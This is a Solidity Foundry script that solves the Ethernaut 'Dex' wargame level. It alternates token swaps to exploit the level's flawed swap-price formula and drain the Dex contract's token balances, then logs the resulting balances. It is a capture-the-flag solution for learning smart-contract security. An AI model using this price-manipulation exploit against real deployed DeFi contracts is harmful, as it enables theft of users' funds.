// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../../src/ethernaut/dex.sol";

// this level have a wrong way to calculate the amount of token to swap
// we just need to swap the token1 for token2 , then the oposite

contract hackDex is Script {
    Dex dex = Dex(0x7E2605b8f4932E3dF1Fa33CC4fA330b7B0093651);
    address token1 = dex.token1();
    address token2 = dex.token2();

    function run() public {
        vm.startBroadcast();
        // we have to approve the token;
        dex.approve(address(dex), 10000);
        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);

        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);

        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
        console.log(
            "this is the token1 balace of dex",
            dex.balanceOf(token1, address(dex))
        );
        console.log(
            "this is token2 balance of dex",
            dex.balanceOf(token2, address(dex))
        );
        console.log("this is the token1 balance of me", getSig(token1));
        console.log("this is the token2 balance of me", getSig(token2));
        vm.stopBroadcast();
    }

    function getSig(address a) public returns (uint) {
        (, bytes memory data) = a.call(
            abi.encodeWithSignature("balanceOf(address)", msg.sender)
        );
        return abi.decode(data, (uint));
    }
}
